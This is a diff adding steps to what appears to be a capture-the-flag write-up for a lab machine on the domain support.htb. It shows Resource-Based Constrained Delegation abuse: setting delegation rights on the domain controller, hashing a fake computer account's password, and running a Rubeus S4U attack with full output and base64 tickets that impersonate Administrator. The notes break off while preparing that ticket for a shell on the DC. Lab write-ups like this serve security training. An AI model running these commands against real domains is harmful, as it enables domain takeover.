@@ -260,4 +260,161 @@ New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureStrin
 Get-ADComputer -identity FAKE-COMP01
 ```
 - configure Resource-Based Constrained Delegation through one of two ways
-  - 
+  - set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module
+  - which will in turn configure the msdsallowedtoactonbehalfofotheridentity attribute on its own
+  - or we can use the PowerView module to directly set the msds-allowedtoactonbehalfofotheridentity attribut
+- Let's use the Set-ADComputer command to configure RBCD
+```
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+```
+- use the Get-ADComputer command to verify the prevoius commadn has worked
+```
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+```
+- the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the command worked
+- verify the value of the msds-allowedtoactonbehalfofotheridentity
+```
+Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+```
+- the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on
+- grab the desired value and dump it to a variable called RawBytes
+```
+$RawBytes = Get-DomainComputer DC -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
+```
+- convert these bytes to a Raw Security Descriptor object
+```
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+```
+- we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control List that specifies the machines that can act on behalf of the DC
+```
+$Descriptor
+$Descriptor.DiscretionaryAcl
+```
+- we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01
+- the AceType is set to AccessAllowed .
+- time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator
+- we will need the hash of the password that was used to create the computer object
+```
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+```
+- grab the value called rc4_hmac . Next, we can generate Kerberos tickets for the Administrator
+```
+*Evil-WinRM* PS C:\Users\support\Documents> ./Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.3
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
+[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP01$'
+[*] Using domain controller: ::1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'FAKE-COMP01$@SUPPORT.HTB'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2self request to ::1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'FAKE-COMP01$@SUPPORT.HTB'
+[*] base64(ticket.kirbi):
+
+      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
+      MA4bDEZBS0UtQ09NUDAxJA==
+
+[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      doIGaDCCBmSgAwIBBaEDAgEWooIFejCCBXZhggVyMIIFbqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
+      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggUzMIIFL6ADAgESoQMCAQWiggUhBIIFHZXuES08
+      ZnfcUghMo6LUyGkXbZmMi3DenSn6cJr03EMUPBWblHMYbW/EaQEgOc0YqmNYxcI3U1f+gZkGJEgg8ZPP
+      KevdQuZdlYqNYSSEkv28wUzyqWdho1D6kaNly04rDQxTCVd4gc66afoCvZdBxmYbgW1c4mMqbHnaKLv5
+      /Z9FhMf00/8ju1MJN7kVEnt41fbjSdRFscTvy7gdr9eR8CeUURPGAYd7NP4f23o2iJMDxBYhpZcwc8OT
+      8qDDBljjwr4bdla86c0UoOAQFg04U2tFhQVsQQMGz7z+lbs9L3+8vI+gcejr2k1VtWmcGIwHm+aMOjCs
+      9bL0U4CTO07NWGFgHaWhNBZkbhsSJ+OgsA53Dy/t8WcWgkPEUhNX5VGaFkgZaNsQyXrmk6y7h/W/2Abc
+      81BG2cg5RF0F53SvSclNtOiGk+y7v4Nrznh0DVg6NeQCbj6OhOwmGKuyweD2YQGhTD2R0WaINKzIirgR
+      sLqM/kQP6Bg9BkYXodNf/nSO9PIY4IGwd+v3A2pPbZ8JX4BLRuS/+MbJjvfem9LZ1B7Bb8D5IJDZoW2T
+      emdceucSHg5xLRvPVxk1auUrs4keVbD9UTVU5haF7HZXCzSLf7OLAM1cO6PO/LCVxJEjb9oznCzttnZZ
+      xmSmioKJ1PPERx0jEGStSkNl35MdudwQ+82k6VBLflesis82ZDxdFvXdZjEaDxHLRXYCBa04yq1ZY5KV
+      aKSxI/fz8zAryV3OwkQLxJn89wu8zQ4ycbiQHvJEqrvfyfeX02gVHYxzZN0yMJ8/nii4QAFcDTDEQkM3
+      6SuEkjKjfY28XK7K/olK1mbPv7wUlsqkLA9llOZrTc4pUsb4EI8qq4PUNXyOT6MOVFwPIOiyf/zSAVL4
+      JmGxmm8zU20kxHbECv16Avu/+0xz+0FNbFvePUYtIJjCAVRH5ZQH5ETzhsmbzhb6803PrOGNZN+OUJhH
+      RLhpjSwxPn8jxf3ORIFA1BYXXINlbT8fVc6oeIbQn7vlfJDf/FhzYcvEy1DcHg0viS0eJCUpwzGe49wc
+      jIzXWxX4Psrkh61eYfj1OfCZTs12ZwTGWDvMWEwKgmxBpJvlbhIVef7DB+neL6Obh2SsiLQWDakUHlRa
+      53thQ+Hsxgu1//7nzW1Bo1o6x8iBFDS9u7Qz76qSmikhlJSm/MjMPMQtJu35mqkkbgTG5rJWxjzgfgfd
+      mXHhminNVmtTgIsyqdya6TtrG2DohVaWa/zGUnilIB0DDlrQyvOS3mwXj+5A4hL4meaYRJCETYPTnMlk
+      ot00GsacJ2Z4Aa4MUzY7UQjHQIqOkNLOiBg0ipr3TsS1hzd1kLQHMhhA8VOvry47nSmyqSIOL9pJB/kC
+      qFDpVE27PW3iuM+ih9GifQd06hbE4GjC+yNEQSp1z/G2JtLX7JPFP3DuWchMDbM78wapBdceiSEzkke7
+      pdmOzmUK+cHhDcEsiu+0CXTEad/NSJq4VSrhbyIX18jF7zkRDwI0h6G51zXJwFAm9RLEE4jU7cI9cHRM
+      9rO0MtgpmQNjnC0GLE0NRJFDEgZYP7EaysAnO0+UibLmjkakjtfCDsDEKDNEk0t74H2xHo+yWAvubCaa
+      wcRbILTSsMpofr/AwBHZsXNlxryaJ1NQZwiJZbrWLQ9mBuwvornXAe6UcL4pFacA7W+mgbkVkKL8eUww
+      UlWMABMZzPHAugZwgQH+hViT/VMbpbHaO5TYFMsJvZ/yw+VU5L/G6ceoHcajgdkwgdagAwIBAKKBzgSB
+      y32ByDCBxaCBwjCBvzCBvKAbMBmgAwIBEaESBBAvlXqvufLvcIX0P/e2v0JFoQ0bC1NVUFBPUlQuSFRC
+      ohowGKADAgEKoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDIzMDczMDE5MTAzNVqmERgP
+      MjAyMzA3MzEwNTEwMzVapxEYDzIwMjMwODA2MTkxMDM1WqgNGwtTVVBQT1JULkhUQqkhMB+gAwIBAqEY
+      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
+[+] Ticket successfully imported!
+```
+- now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator
+- copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64
